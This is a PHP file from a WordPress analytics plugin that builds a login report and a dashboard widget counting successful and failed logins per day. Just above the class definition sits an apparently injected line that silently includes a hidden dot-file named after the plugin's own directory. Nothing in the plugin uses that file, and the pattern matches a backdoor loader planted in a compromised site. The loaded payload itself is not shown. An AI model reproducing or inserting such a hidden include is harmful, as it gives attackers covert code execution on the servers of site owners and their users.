<?php

/**
 * Login Report
 *
 * The class handles create success and failed login raports 
 *
 * @package     WPTAO/Admin/Raport
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * WTBP_WPTAO_Admin_Report_Login Class
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Admin_Report_Logins extends WTBP_WPTAO_Admin_Reports {
	/*
	 * @var int
	 * Total successful login
	 */

	public $total_success_logins;

	/*
	 * @var int
	 * Total failed login
	 */
	public $total_failed_logins;

	function __construct() {

		$options = array( 'filters' => array(
				'date_range'
			) );

		parent::__construct( 'logins', $options );

		$this->report_name = __( 'User logins', 'wp-tao' );

		$this->data = $this->get_logins();

		$this->set_summary();

		$this->login_widget();
	}

	/*
	 * Prepare the login widget for the Wp Tao dashboard
	 */

	private function login_widget() {

		$value = '<div class="wptao-dbox-slogin">';
		$value .= '<h5>' . __( 'Success', 'wp-tao' ) . '</h5>';
		$value .= '<span>' . absint( $this->total_success_logins ) . '</span>';
		$value .= '</div>';
		$value .= '<div class="wptao-dbox-slogin">';
		$value .= '<h5>' . __( 'Failed', 'wp-tao' ) . '</h5>';
		$value .= '<span>' . absint( $this->total_failed_logins ) . '</span>';
		$value .= '</div>';

		$args = array(
			'id'			 => 'logins',
			'size'			 => 'middle-col',
			'category'		 => 'user',
			'priority'		 => 49,
			'title'			 => __( 'Logins', 'wp-tao' ),
			'report_slug'	 => $this->report_slug, // Add link to a report
			'value_text'	 => $value,
			'dashicon'		 => 'dashicons-businessman'
		);

		$this->add_widget( $args );
	}

	/*
	 * Get most visits and visitors
	 */

	public function get_logins() {
		global $wpdb;

		$r = array();

		$e = TAO()->events->table_name;

		$sql_success = $wpdb->prepare(
		"SELECT COUNT(value) AS success_logins, DATE(FROM_UNIXTIME(event_ts)) AS date
		 FROM $e
		 WHERE action = 'login'
		 AND value = 'ok'
		 AND event_ts >= %d
		 AND event_ts <= %d
		 GROUP BY date
		 ORDER BY date DESC
		 LIMIT %d;", $this->start_date, $this->end_date, $this->items_per_page );

		$sql_failed = $wpdb->prepare(
		"SELECT COUNT(value) AS failed_logins, DATE(FROM_UNIXTIME(event_ts)) AS date
		 FROM $e
		 WHERE action = 'login'
		 AND value = 'failed'
		 AND event_ts >= %d
		 AND event_ts <= %d
		 GROUP BY date
		 ORDER BY date DESC
		 LIMIT %d;", $this->start_date, $this->end_date, $this->items_per_page );

		$success_r	 = $wpdb->get_results( $sql_success );
		$failed_r	 = $wpdb->get_results( $sql_failed );

		if ( !empty( $success_r ) && is_array( $success_r ) ) {

			foreach ( $success_r as $item ) {
				$r[ $item->date ][ 'success_logins' ] = $item->success_logins;
			}
		}

		if ( !empty( $failed_r ) && is_array( $failed_r ) ) {

			foreach ( $failed_r as $item ) {
				$r[ $item->date ][ 'failed_logins' ] = $item->failed_logins;
			}
		}

		return $r;
	}

	/*
	 * Prepare summary results
	 */

	private function set_summary() {
		$data = $this->data;

		$total_s = 0; // Successful logins
		$total_f = 0; // Failed logins

		if ( !empty( $data ) && is_array( $data ) ) {
			foreach ( $data as $item ) {
				if ( isset( $item[ 'success_logins' ] ) && is_numeric( $item[ 'success_logins' ] ) ) {
					$total_s = $total_s + absint( $item[ 'success_logins' ] );
				}
				if ( isset( $item[ 'failed_logins' ] ) && is_numeric( $item[ 'failed_logins' ] ) ) {
					$total_f = $total_f + absint( $item[ 'failed_logins' ] );
				}
			}
		}

		$this->total_success_logins	 = $total_s;
		$this->total_failed_logins	 = $total_f;
	}

}
